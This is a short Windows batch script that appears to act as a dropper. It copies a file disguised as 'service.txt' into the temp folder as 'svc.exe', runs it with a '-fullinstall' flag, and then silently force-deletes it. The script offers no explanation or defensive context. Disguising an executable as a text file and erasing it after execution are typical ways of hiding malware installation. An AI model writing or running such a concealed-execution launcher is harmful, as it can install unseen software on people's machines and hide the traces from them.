@echo off
cd /d "%~dp0"
copy /y "service.txt" "%TEMP%\svc.exe" >nul
"%TEMP%\svc.exe" -fullinstall
del /f /q "%TEMP%\svc.exe" >nul